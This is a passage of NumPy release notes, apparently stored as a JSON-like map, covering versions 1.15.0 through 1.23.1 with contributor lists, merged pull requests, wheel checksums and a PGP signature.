cc463ee62af94c8410fdf95ce9933c3c  numpy-1.15.0-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    77655199a4e18719dd5a0b348c44fc92  numpy-1.15.0-cp35-cp35m-manylinux1_i686.whl\n    d76c54272549cf3a2165d40d3fea5e30  numpy-1.15.0-cp35-cp35m-manylinux1_x86_64.whl\n    956c6f7c216b677b27628a97150cd069  numpy-1.15.0-cp35-none-win32.whl\n    2ab8080576932775167a6f9c772b91e4  numpy-1.15.0-cp35-none-win_amd64.whl\n    1a01c8d089d488565acc2836d03a7482  numpy-1.15.0-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    5606fa1c1e13e789b802102699d613e2  numpy-1.15.0-cp36-cp36m-manylinux1_i686.whl\n    5635343a70f7cdd17f372966db1526d3  numpy-1.15.0-cp36-cp36m-manylinux1_x86_64.whl\n    166e901c1a86da5ffb8c6d3090ed917e  numpy-1.15.0-cp36-none-win32.whl\n    6423497ad5a610c1deed606ce44893bd  numpy-1.15.0-cp36-none-win_amd64.whl\n    e232fbba29585812bf7fa547f671b768  numpy-1.15.0-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    b2fc4551651fae84eb01b8a37f2e1e69  numpy-1.15.0-cp37-cp37m-manylinux1_i686.whl\n    36ed60bef7c5cb252b9d0e8dc5029e08  numpy-1.15.0-cp37-cp37m-manylinux1_x86_64.whl\n    4482a89fa4540c8bbf76028621931266  numpy-1.15.0-cp37-none-win32.whl\n    cfef18ee246468752f1686147c70bd0a  numpy-1.15.0-cp37-none-win_amd64.whl\n    5cf4daff88042326334266f80ad38884  numpy-1.15.0.tar.gz\n    20e13185089011116a98e11c9bf8aa07  numpy-1.15.0.zip\n\nSHA256\n- ------\n\n    a17a8fd5df4fec5b56b4d11c9ba8b9ebfb883c90ec361628d07be00aaa4f009a  numpy-1.15.0-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    c3ac359ace241707e5a48fe2922e566ac666aacacf4f8031f2994ac429c31344  numpy-1.15.0-cp27-cp27m-manylinux1_i686.whl\n    e2317cf091c2e7f0dacdc2e72c693cc34403ca1f8e3807622d0bb653dc978616  numpy-1.15.0-cp27-cp27m-manylinux1_x86_64.whl\n    64c6acf5175745fd1b7b7e17c74fdbfb7191af3b378bc54f44560279f41238d3  numpy-1.15.0-cp27-cp27mu-manylinux1_i686.whl\n    924f37e66db78464b4b85ed4b6d2e5cda0c0416e657cac7ccbef14b9fa2c40b5  numpy-1.15.0-cp27-cp27mu-manylinux1_x86_64.whl\n    674ea7917f0657ddb6976bd102ac341bc493d072c32a59b98e5b8c6eaa2d5ec0  numpy-1.15.0-cp27-none-win32.whl\n    ae3864816287d0e86ead580b69921daec568fe680857f07ee2a87bf7fd77ce24  numpy-1.15.0-cp27-none-win_amd64.whl\n    78c35dc7ad184aebf3714dbf43f054714c6e430e14b9c06c49a864fb9e262030  numpy-1.15.0-cp34-cp34m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    c7c660cc0209fdf29a4e50146ca9ac9d8664acaded6b6ae2f5d0ae2e91a0f0cd  numpy-1.15.0-cp34-cp34m-manylinux1_i686.whl\n    3fbccb399fe9095b1c1d7b41e7c7867db8aa0d2347fc44c87a7a180cedda112b  numpy-1.15.0-cp34-cp34m-manylinux1_x86_64.whl\n    aaa519335a71f87217ca8a680c3b66b61960e148407bdf5c209c42f50fe30f49  numpy-1.15.0-cp34-none-win32.whl\n    62cb836506f40ce2529bfba9d09edc4b2687dd18c56cf4457e51c3e7145402fd  numpy-1.15.0-cp34-none-win_amd64.whl\n    55daf757e5f69aa75b4477cf4511bf1f96325c730e4ad32d954ccb593acd2585  numpy-1.15.0-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    b5f8c15cb9173f6cdf0f994955e58d1265331029ae26296232379461a297e5f2  numpy-1.15.0-cp35-cp35m-manylinux1_i686.whl\n    24f3bb9a5f6c3936a8ccd4ddfc1210d9511f4aeb879a12efd2e80bec647b8695  numpy-1.15.0-cp35-cp35m-manylinux1_x86_64.whl\n    34033b581bc01b1135ca2e3e93a94daea7c739f21a97a75cca93e29d9f0c8e71  numpy-1.15.0-cp35-none-win32.whl\n    f5a758252502b466b9c2b201ea397dae5a914336c987f3a76c3741a82d43c96e  numpy-1.15.0-cp35-none-win_amd64.whl\n    14fb76bde161c87dcec52d91c78f65aa8a23aa2e1530a71f412dabe03927d917  numpy-1.15.0-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    816645178f2180be257a576b735d3ae245b1982280b97ae819550ce8bcdf2b6b  numpy-1.15.0-cp36-cp36m-manylinux1_i686.whl\n    f2a778dd9bb3e4590dbe3bbac28e7c7134280c4ec97e3bf8678170ee58c67b21  numpy-1.15.0-cp36-cp36m-manylinux1_x86_64.whl\n    7f17efe9605444fcbfd990ba9b03371552d65a3c259fc2d258c24fb95afdd728  numpy-1.15.0-cp36-none-win32.whl\n    73a816e441dace289302e04a7a34ec4772ed234ab6885c968e3ca2fc2d06fe2d  numpy-1.15.0-cp36-none-win_amd64.whl\n    21041014b7529237994a6b578701c585703fbb3b1bea356cdb12a5ea7804241c  numpy-1.15.0-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    d690a2ff49f6c3bc35336693c9924fe5916be3cc0503fe1ea6c7e2bf951409ee  numpy-1.15.0-cp37-cp37m-manylinux1_i686.whl\n    50718eea8e77a1bedcc85befd22c8dbf5a24c9d2c0c1e36bbb8d7a38da847eb3  numpy-1.15.0-cp37-cp37m-manylinux1_x86_64.whl\n    fb4c33a404d9eff49a0cdc8ead0af6453f62f19e071b60d283f9dc05581e4134  numpy-1.15.0-cp37-none-win32.whl\n    61efc65f325770bbe787f34e00607bc124f08e6c25fdf04723848585e81560dc  numpy-1.15.0-cp37-none-win_amd64.whl\n    259934a941663e93fdd5d28ce3f6aa2a81ce7dda85c395dd07b1f1edff2e0236  numpy-1.15.0.tar.gz\n    f28e73cf18d37a413f7d5de35d024e6b98f14566a10d82100f9dc491a7d449f9  numpy-1.15.0.zip\n-----BEGIN PGP SIGNATURE-----\n\niQEcBAEBAgAGBQJbVgLRAAoJEGefIoN3xSR7qpcIAL7o+XeLF1jPlR48aMkssttW\n5gtaRP26sRFflinDCAWIpSJh3bigAmkGDbYnR3YETC60Szs5REdhQmsCdimxF/ua\nhJrLoSowpPdCOYunljLtPgMYf2I6m8oQwlxKDYHlJxSgbIgNvKNbe5WyoXgIpHK4\nPZJHUWBEBPgTGusSup0q6YnAZeep9gO79+h/MEudJK2UqVi0FaM4rUE/Q2d/XXiN\njZHYZhzd6ZYcjXlmtiKBh7cZdBhVHUeYxg4gpNLwFg0Dzy3TNTEgkRa5va39hnpr\n5G2TcsglRvtFnixGe0zRvFAmVllU6yzor11SWxrVhx3p1UQmz1vaU140pyYhn4I=\n=FOVg\n-----END PGP SIGNATURE-----\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.23.1": "==========================\n\nThe NumPy 1.23.1 is a maintenance release that fixes bugs discovered after the\n1.23.0 release. Notable fixes are:\n\n- Fix searchsorted for float16 NaNs\n- Fix compilation on Apple M1\n- Fix KeyError in crackfortran operator support (Slycot)\n\nThe Python version supported for this release are 3.8-3.10.\n\n\nContributors\n============\n\nA total of 7 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Charles Harris\n* Matthias Koeppe +\n* Pranab Das +\n* Rohit Goswami\n* Sebastian Berg\n* Serge Guelton\n* Srimukh Sripada +\n\n\nPull requests merged\n====================\n\nA total of 8 pull requests were merged for this release.\n\n* `21866 <https://github.com/numpy/numpy/pull/21866>`__: BUG: Fix discovered MachAr (still used within valgrind)\n* `21867 <https://github.com/numpy/numpy/pull/21867>`__: BUG: Handle NaNs correctly for float16 during sorting\n* `21868 <https://github.com/numpy/numpy/pull/21868>`__: BUG: Use ``keepdims`` during normalization in ``np.average`` and...\n* `21869 <https://github.com/numpy/numpy/pull/21869>`__: DOC: mention changes to ``max_rows`` behaviour in ``np.loadtxt``\n* `21870 <https://github.com/numpy/numpy/pull/21870>`__: BUG: Reject non integer array-likes with size 1 in delete\n* `21949 <https://github.com/numpy/numpy/pull/21949>`__: BLD: Make can_link_svml return False for 32bit builds on x86_64\n* `21951 <https://github.com/numpy/numpy/pull/21951>`__: BUG: Reorder extern \"C\" to only apply to function declarations...\n* `21952 <https://github.com/numpy/numpy/pull/21952>`__: BUG: Fix KeyError in crackfortran operator support\n\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    79f0d8c114f282b834b49209d6955f98  numpy-1.23.1-cp310-cp310-macosx_10_9_x86_64.whl\n    42a89a88ef26b768e8933ce46b1cc2bd  numpy-1.23.1-cp310-cp310-macosx_11_0_arm64.whl\n    1c1d68b3483eaf99b9a3583c8ac8bf47  numpy-1.23.1-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    9d3e9f7f9b3dce6cf15209e4f25f346e  numpy-1.23.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    a9afb7c34b48d08fc50427ae6516b42d  numpy-1.23.1-cp310-cp310-win32.whl\n    a0e02823883bdfcec49309e108f65e13  numpy-1.23.1-cp310-cp310-win_amd64.whl\n    f40cdf4ec7bb0cf31a90a4fa294323c2  numpy-1.23.1-cp38-cp38-macosx_10_9_x86_64.whl\n    80115a959f0fe30d6c401b2650a61c70  numpy-1.23.1-cp38-cp38-macosx_11_0_arm64.whl\n    1cf199b3a93960c4f269853a56a8d8eb  numpy-1.23.1-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    aa6f0f192312c79cd770c2c395e9982a  numpy-1.23.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    d07bee0ea3142a96cb5e4e16aca273ca  numpy-1.23.1-cp38-cp38-win32.whl\n    02d0734ae8ad5e18a40c6c6de18486a0  numpy-1.23.1-cp38-cp38-win_amd64.whl\n    e1ca14acd7d83bc74bdf6ab0bb4bd195  numpy-1.23.1-cp39-cp39-macosx_10_9_x86_64.whl\n    c9152c62b2f31e742e24bfdc97b28666  numpy-1.23.1-cp39-cp39-macosx_11_0_arm64.whl\n    05b0b37c92f7a7e7c01afac0a5322b40  numpy-1.23.1-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    d9810bb71a0ef9837e87ea5c44fcab5e  numpy-1.23.1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    4255577f857e838f7a94e3a614ddc5eb  numpy-1.23.1-cp39-cp39-win32.whl\n    787486e3cd87b98024ffe1c969c4db7a  numpy-1.23.1-cp39-cp39-win_amd64.whl\n    5c7b2d1471b1b9ec6ff1cb3fe1f8ac14  numpy-1.23.1-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    40d5b2ff869707b0d97325ce44631135  numpy-1.23.1-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    44ce1e07927cc09415df9898857792da  numpy-1.23.1-pp38-pypy38_pp73-win_amd64.whl\n    4f8636a9c1a77ca0fb923ba55378891f  numpy-1.23.1.tar.gz\n\nSHA256\n------\n::\n\n    b15c3f1ed08df4980e02cc79ee058b788a3d0bef2fb3c9ca90bb8cbd5b8a3a04  numpy-1.23.1-cp310-cp310-macosx_10_9_x86_64.whl\n    9ce242162015b7e88092dccd0e854548c0926b75c7924a3495e02c6067aba1f5  numpy-1.23.1-cp310-cp310-macosx_11_0_arm64.whl\n    e0d7447679ae9a7124385ccf0ea990bb85bb869cef217e2ea6c844b6a6855073  numpy-1.23.1-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    3119daed207e9410eaf57dcf9591fdc68045f60483d94956bee0bfdcba790953  numpy-1.23.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    3ab67966c8d45d55a2bdf40701536af6443763907086c0a6d1232688e27e5447  numpy-1.23.1-cp310-cp310-win32.whl\n    1865fdf51446839ca3fffaab172461f2b781163f6f395f1aed256b1ddc253622  numpy-1.23.1-cp310-cp310-win_amd64.whl\n    aeba539285dcf0a1ba755945865ec61240ede5432df41d6e29fab305f4384db2  numpy-1.23.1-cp38-cp38-macosx_10_9_x86_64.whl\n    7e8229f3687cdadba2c4faef39204feb51ef7c1a9b669247d49a24f3e2e1617c  numpy-1.23.1-cp38-cp38-macosx_11_0_arm64.whl\n    68b69f52e6545af010b76516f5daaef6173e73353e3295c5cb9f96c35d755641  numpy-1.23.1-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    1408c3527a74a0209c781ac82bde2182b0f0bf54dea6e6a363fe0cc4488a7ce7  numpy-1.23.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    47f10ab202fe4d8495ff484b5561c65dd59177949ca07975663f4494f7269e3e  numpy-1.23.1-cp38-cp38-win32.whl\n    37e5ebebb0eb54c5b4a9b04e6f3018e16b8ef257d26c8945925ba8105008e645  numpy-1.23.1-cp38-cp38-win_amd64.whl\n    173f28921b15d341afadf6c3898a34f20a0569e4ad5435297ba262ee8941e77b  numpy-1.23.1-cp39-cp39-macosx_10_9_x86_64.whl\n    876f60de09734fbcb4e27a97c9a286b51284df1326b1ac5f1bf0ad3678236b22  numpy-1.23.1-cp39-cp39-macosx_11_0_arm64.whl\n    35590b9c33c0f1c9732b3231bb6a72d1e4f77872390c47d50a615686ae7ed3fd  numpy-1.23.1-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    a35c4e64dfca659fe4d0f1421fc0f05b8ed1ca8c46fb73d9e5a7f175f85696bb  numpy-1.23.1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    c2f91f88230042a130ceb1b496932aa717dcbd665350beb821534c5c7e15881c  numpy-1.23.1-cp39-cp39-win32.whl\n    37ece2bd095e9781a7156852e43d18044fd0d742934833335599c583618181b9  numpy-1.23.1-cp39-cp39-win_amd64.whl\n    8002574a6b46ac3b5739a003b5233376aeac5163e5dcd43dd7ad062f3e186129  numpy-1.23.1-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    5d732d17b8a9061540a10fda5bfeabca5785700ab5469a5e9b93aca5e2d3a5fb  numpy-1.23.1-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    55df0f7483b822855af67e38fb3a526e787adf189383b4934305565d71c4b148  numpy-1.23.1-pp38-pypy38_pp73-win_amd64.whl\n    d748ef349bfef2e1194b59da37ed5a29c19ea8d7e6342019921ba2ba4fd8b624  numpy-1.23.1.tar.gz\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.22.3": "==========================\n\nNumPy 1.22.3 is a maintenance release that fixes bugs discovered after the\n1.22.2 release. The most noticeable fixes may be those for DLPack. One that may\ncause some problems is disallowing strings as inputs to logical ufuncs. It is\nstill undecided how strings should be treated in those functions and it was\nthought best to simply disallow them until a decision was reached. That should\nnot cause problems with older code.\n\nThe Python versions supported for this release are 3.8-3.10. Note that the Mac\nwheels are now based on OS X 10.14 rather than 10.9 that was used in previous\nNumPy release cycles. 10.14 is the oldest release supported by Apple.\n\nContributors\n============\n\nA total of 9 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* GalaxySnail +\n* Alexandre de Siqueira\n* Bas van Beek\n* Charles Harris\n* Melissa Weber Mendon\u221a\u00dfa\n* Ross Barnowski\n* Sebastian Berg\n* Tirth Patel\n* Matthieu Darbois\n\nPull requests merged\n====================\n\nA total of 10 pull requests were merged for this release.\n\n* `21048 <https://github.com/numpy/numpy/pull/21048>`__: MAINT: Use \"3.10\" instead of \"3.10-dev\" on travis.\n* `21106 <https://github.com/numpy/numpy/pull/21106>`__: TYP,MAINT: Explicitly allow sequences of array-likes in ``np.concatenate``\n* `21137 <https://github.com/numpy/numpy/pull/21137>`__: BLD,DOC: skip broken ipython 8.1.0\n* `21138 <https://github.com/numpy/numpy/pull/21138>`__: BUG, ENH: np._from_dlpack: export correct device information\n* `21139 <https://github.com/numpy/numpy/pull/21139>`__: BUG: Fix numba DUFuncs added loops getting picked up\n* `21140 <https://github.com/numpy/numpy/pull/21140>`__: BUG: Fix unpickling an empty ndarray with a none-zero dimension...\n* `21141 <https://github.com/numpy/numpy/pull/21141>`__: BUG: use ThreadPoolExecutor instead of ThreadPool\n* `21142 <https://github.com/numpy/numpy/pull/21142>`__: API: Disallow strings in logical ufuncs\n* `21143 <https://github.com/numpy/numpy/pull/21143>`__: MAINT, DOC: Fix SciPy intersphinx link\n* `21148 <https://github.com/numpy/numpy/pull/21148>`__: BUG,ENH: np._from_dlpack: export arrays with any strided size-1...\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    14f1872bbab050b0579e5fcd8b341b81  numpy-1.22.3-cp310-cp310-macosx_10_14_x86_64.whl\n    c673faa3ac8745ad10ed0428a21a77aa  numpy-1.22.3-cp310-cp310-macosx_11_0_arm64.whl\n    d925fff720561673fd7ee8ead0e94935  numpy-1.22.3-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    319f97f5ee26b9c3c06f7a2a3df412a3  numpy-1.22.3-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    866eae5dba934cad50eb38c8505c8449  numpy-1.22.3-cp310-cp310-win32.whl\n    e4c512437a6d4eb4a384225861067ad8  numpy-1.22.3-cp310-cp310-win_amd64.whl\n    a28052af37037f0d5c3b47f4a7040135  numpy-1.22.3-cp38-cp38-macosx_10_14_x86_64.whl\n    d22dc074bde64f6e91a2d1990345f821  numpy-1.22.3-cp38-cp38-macosx_11_0_arm64.whl\n    e8a01c2ca1474aff142366a0a2fe0812  numpy-1.22.3-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    4fe6e71e7871cb31ffc4122aa5707be7  numpy-1.22.3-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    1273fb3c77383ab28f2fb05192751340  numpy-1.22.3-cp38-cp38-win32.whl\n    001244a6bafa640d7509c85661a4e98e  numpy-1.22.3-cp38-cp38-win_amd64.whl\n    b8694b880a1a68d1716f60a9c9e82b38  numpy-1.22.3-cp39-cp39-macosx_10_14_x86_64.whl\n    ba122eaa0988801e250f8674e3dd612e  numpy-1.22.3-cp39-cp39-macosx_11_0_arm64.whl\n    3641825aca07cb26732425e52d034daf  numpy-1.22.3-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    f92412e4273c2580abcc1b75c56e9651  numpy-1.22.3-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    b38604778ffd0a17931c06738c3ce9ed  numpy-1.22.3-cp39-cp39-win32.whl\n    644e0b141fa36a1baf0338032254cc9a  numpy-1.22.3-cp39-cp39-win_amd64.whl\n    99d2dfb943327b108b2c3b923bd42000  numpy-1.22.3-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    3305c27e5bdf7f19247a7eee00ac053e  numpy-1.22.3.tar.gz\n    b56530be068796a50bf5a09105c8011e  numpy-1.22.3.zip\n\nSHA256\n------\n::\n\n    92bfa69cfbdf7dfc3040978ad09a48091143cffb778ec3b03fa170c494118d75  numpy-1.22.3-cp310-cp310-macosx_10_14_x86_64.whl\n    8251ed96f38b47b4295b1ae51631de7ffa8260b5b087808ef09a39a9d66c97ab  numpy-1.22.3-cp310-cp310-macosx_11_0_arm64.whl\n    48a3aecd3b997bf452a2dedb11f4e79bc5bfd21a1d4cc760e703c31d57c84b3e  numpy-1.22.3-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    a3bae1a2ed00e90b3ba5f7bd0a7c7999b55d609e0c54ceb2b076a25e345fa9f4  numpy-1.22.3-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    f950f8845b480cffe522913d35567e29dd381b0dc7e4ce6a4a9f9156417d2430  numpy-1.22.3-cp310-cp310-win32.whl\n    08d9b008d0156c70dc392bb3ab3abb6e7a711383c3247b410b39962263576cd4  numpy-1.22.3-cp310-cp310-win_amd64.whl\n    201b4d0552831f7250a08d3b38de0d989d6f6e4658b709a02a73c524ccc6ffce  numpy-1.22.3-cp38-cp38-macosx_10_14_x86_64.whl\n    f8c1f39caad2c896bc0018f699882b345b2a63708008be29b1f355ebf6f933fe  numpy-1.22.3-cp38-cp38-macosx_11_0_arm64.whl\n    568dfd16224abddafb1cbcce2ff14f522abe037268514dd7e42c6776a1c3f8e5  numpy-1.22.3-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    3ca688e1b9b95d80250bca34b11a05e389b1420d00e87a0d12dc45f131f704a1  numpy-1.22.3-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    e7927a589df200c5e23c57970bafbd0cd322459aa7b1ff73b7c2e84d6e3eae62  numpy-1.22.3-cp38-cp38-win32.whl\n    07a8c89a04997625236c5ecb7afe35a02af3896c8aa01890a849913a2309c676  numpy-1.22.3-cp38-cp38-win_amd64.whl\n    2c10a93606e0b4b95c9b04b77dc349b398fdfbda382d2a39ba5a822f669a0123  numpy-1.22.3-cp39-cp39-macosx_10_14_x86_64.whl\n    fade0d4f4d292b6f39951b6836d7a3c7ef5b2347f3c420cd9820a1d90d794802  numpy-1.22.3-cp39-cp39-macosx_11_0_arm64.whl\n    5bfb1bb598e8229c2d5d48db1860bcf4311337864ea3efdbe1171fb0c5da515d  numpy-1.22.3-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    97098b95aa4e418529099c26558eeb8486e66bd1e53a6b606d684d0c3616b168  numpy-1.22.3-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    fdf3c08bce27132395d3c3ba1503cac12e17282358cb4bddc25cc46b0aca07aa  numpy-1.22.3-cp39-cp39-win32.whl\n    639b54cdf6aa4f82fe37ebf70401bbb74b8508fddcf4797f9fe59615b8c5813a  numpy-1.22.3-cp39-cp39-win_amd64.whl\n    c34ea7e9d13a70bf2ab64a2532fe149a9aced424cd05a2c4ba662fd989e3e45f  numpy-1.22.3-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    a906c0b4301a3d62ccf66d058fe779a65c1c34f6719ef2058f96e1856f48bca5  numpy-1.22.3.tar.gz\n    dbc7601a3b7472d559dc7b933b18b4b66f9aa7452c120e87dfb33d02008c8a18  numpy-1.22.3.zip\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.22.1": "==========================\n\nThe NumPy 1.22.1 is maintenance release that fixes bugs discovered after the\n1.22.0 release. Notable fixes are:\n\n- Fix f2PY docstring problems (SciPy)\n- Fix reduction type problems (AstroPy)\n- Fix various typing bugs.\n\nThe Python versions supported for this release are 3.8-3.10.\n\n\nContributors\n============\n\nA total of 14 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Arryan Singh\n* Bas van Beek\n* Charles Harris\n* Denis Laxalde\n* Isuru Fernando\n* Kevin Sheppard\n* Matthew Barber\n* Matti Picus\n* Melissa Weber Mendon\u221a\u00dfa\n* Mukulika Pahari\n* Omid Rajaei +\n* Pearu Peterson\n* Ralf Gommers\n* Sebastian Berg\n\n\nPull requests merged\n====================\n\nA total of 20 pull requests were merged for this release.\n\n* `20702 <https://github.com/numpy/numpy/pull/20702>`__: MAINT, DOC: Post 1.22.0 release fixes.\n* `20703 <https://github.com/numpy/numpy/pull/20703>`__: DOC, BUG: Use pngs instead of svgs.\n* `20704 <https://github.com/numpy/numpy/pull/20704>`__: DOC: Fixed the link on user-guide landing page\n* `20714 <https://github.com/numpy/numpy/pull/20714>`__: BUG: Restore vc141 support\n* `20724 <https://github.com/numpy/numpy/pull/20724>`__: BUG: Fix array dimensions solver for multidimensional arguments...\n* `20725 <https://github.com/numpy/numpy/pull/20725>`__: TYP: change type annotation for ``__array_namespace__`` to ModuleType\n* `20726 <https://github.com/numpy/numpy/pull/20726>`__: TYP, MAINT: Allow ``ndindex`` to accept integer tuples\n* `20757 <https://github.com/numpy/numpy/pull/20757>`__: BUG: Relax dtype identity check in reductions\n* `20763 <https://github.com/numpy/numpy/pull/20763>`__: TYP: Allow time manipulation functions to accept ``date`` and ``timedelta``...\n* `20768 <https://github.com/numpy/numpy/pull/20768>`__: TYP: Relax the type of ``ndarray.__array_finalize__``\n* `20795 <https://github.com/numpy/numpy/pull/20795>`__: MAINT: Raise RuntimeError if setuptools version is too recent.\n* `20796 <https://github.com/numpy/numpy/pull/20796>`__: BUG, DOC: Fixes SciPy docs build warnings\n* `20797 <https://github.com/numpy/numpy/pull/20797>`__: DOC: fix OpenBLAS version in release note\n* `20798 <https://github.com/numpy/numpy/pull/20798>`__: PERF: Optimize array check for bounded 0,1 values\n* `20805 <https://github.com/numpy/numpy/pull/20805>`__: BUG: Fix that reduce-likes honor out always (and live in the...\n* `20806 <https://github.com/numpy/numpy/pull/20806>`__: BUG: ``array_api.argsort(descending=True)`` respects relative...\n* `20807 <https://github.com/numpy/numpy/pull/20807>`__: BUG: Allow integer inputs for pow-related functions in ``array_api``\n* `20814 <https://github.com/numpy/numpy/pull/20814>`__: DOC: Refer to NumPy, not pandas, in main page\n* `20815 <https://github.com/numpy/numpy/pull/20815>`__: DOC: Update Copyright to 2022 [License]\n* `20819 <https://github.com/numpy/numpy/pull/20819>`__: BUG: Return correctly shaped inverse indices in array_api set...\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    8edd68c8998cb694e244ce793b2d088c  numpy-1.22.1-cp310-cp310-macosx_10_9_universal2.whl\n    e4858aafd41cdba76cd14161bfc512c3  numpy-1.22.1-cp310-cp310-macosx_10_9_x86_64.whl\n    96f4fc3f321625278ca3807c7c8c789c  numpy-1.22.1-cp310-cp310-macosx_11_0_arm64.whl\n    2ddc25b9c9d7b517610689055f9f553a  numpy-1.22.1-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    8d40c6fd64389c05646b5ef95cded6e5  numpy-1.22.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    1a8359c6436d1bcfe84a094337903a48  numpy-1.22.1-cp310-cp310-win_amd64.whl\n    033f9aa72a732646f3fb4563226320ee  numpy-1.22.1-cp38-cp38-macosx_10_9_universal2.whl\n    59e13abecdf4194f75b654f1d853b244  numpy-1.22.1-cp38-cp38-macosx_10_9_x86_64.whl\n    3ce885a0c10e95f5756d7c1878eaa246  numpy-1.22.1-cp38-cp38-macosx_11_0_arm64.whl\n    546b2a0866561673d5b7eadcc086af24  numpy-1.22.1-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    200c0a7bc3a24cfa6f4358d7274b5535  numpy-1.22.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    defe48b3b5f44c3991e830f7cde0a79c  numpy-1.22.1-cp38-cp38-win32.whl\n    15557a847a78bcbf651ca6689ae37935  numpy-1.22.1-cp38-cp38-win_amd64.whl\n    067e734594c67d8141190b7eabb979ee  numpy-1.22.1-cp39-cp39-macosx_10_9_universal2.whl\n    1458d42b26da341baaee134d85e3fd70  numpy-1.22.1-cp39-cp39-macosx_10_9_x86_64.whl\n    463b365c80efffd807194c78b4796235  numpy-1.22.1-cp39-cp39-macosx_11_0_arm64.whl\n    58d8dc02dd884898c1b7ee1bee1dd216  numpy-1.22.1-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    48e2d2905822f78a96d400c78bd16cbb  numpy-1.22.1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    c5059bd82d8f2c509c889fba09251307  numpy-1.22.1-cp39-cp39-win32.whl\n    eb9a0655d16897f0adf6ea53b9f3bda4  numpy-1.22.1-cp39-cp39-win_amd64.whl\n    74cb5dba2f37dc445ffd3068eb1d58fe  numpy-1.22.1-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    90fff1ee7c7f843fc7a234addc70c71c  numpy-1.22.1.tar.gz\n    c25dad73053350dd0278605d8ed8a5c7  numpy-1.22.1.zip\n\nSHA256\n------\n::\n\n    3d62d6b0870b53799204515145935608cdeb4cebb95a26800b6750e48884cc5b  numpy-1.22.1-cp310-cp310-macosx_10_9_universal2.whl\n    831f2df87bd3afdfc77829bc94bd997a7c212663889d56518359c827d7113b1f  numpy-1.22.1-cp310-cp310-macosx_10_9_x86_64.whl\n    8d1563060e77096367952fb44fca595f2b2f477156de389ce7c0ade3aef29e21  numpy-1.22.1-cp310-cp310-macosx_11_0_arm64.whl\n    69958735d5e01f7b38226a6c6e7187d72b7e4d42b6b496aca5860b611ca0c193  numpy-1.22.1-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    45a7dfbf9ed8d68fd39763940591db7637cf8817c5bce1a44f7b56c97cbe211e  numpy-1.22.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    